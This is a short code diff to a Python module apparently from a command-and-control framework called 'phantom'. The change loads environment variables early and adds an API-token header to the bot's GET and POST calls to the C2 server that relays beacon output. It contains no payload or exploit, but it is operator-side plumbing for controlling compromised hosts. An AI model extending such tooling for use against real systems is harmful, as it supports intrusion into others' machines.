@@ -32,6 +32,11 @@ from io import BytesIO
 
 logger = logging.getLogger(__name__)
 
+# Load .env BEFORE reading any env var — guarantees BOT_TOKEN is available
+# even when load_dotenv() hasn't been called yet by c2_server
+from dotenv import load_dotenv
+load_dotenv()
+
 from phantom.utils.c2_helpers import format_beacon_output as _format_beacon_output
 
 try:
@@ -53,9 +58,19 @@ bot_app = None
 _bot_thread = None
 
 
+API_TOKEN = os.getenv("PHANTOM_API_TOKEN", "")
+
+def _headers():
+    h = {"Content-Type": "application/json"}
+    if API_TOKEN:
+        h["X-Api-Token"] = API_TOKEN
+    return h
+
+
 def _api_get(path):
     try:
-        r = urllib.request.urlopen(C2_API + path, timeout=30)
+        req = urllib.request.Request(C2_API + path, headers=_headers())
+        r = urllib.request.urlopen(req, timeout=30)
         return json.loads(r.read())
     except Exception:
         return None
@@ -64,7 +79,8 @@ def _api_get(path):
 def _api_post(path, data):
     try:
         body = json.dumps(data).encode()
-        r = urllib.request.urlopen(C2_API + path, data=body, timeout=30)
+        req = urllib.request.Request(C2_API + path, data=body, headers=_headers(), method="POST")
+        r = urllib.request.urlopen(req, timeout=30)
         return json.loads(r.read())
     except Exception:
         return None
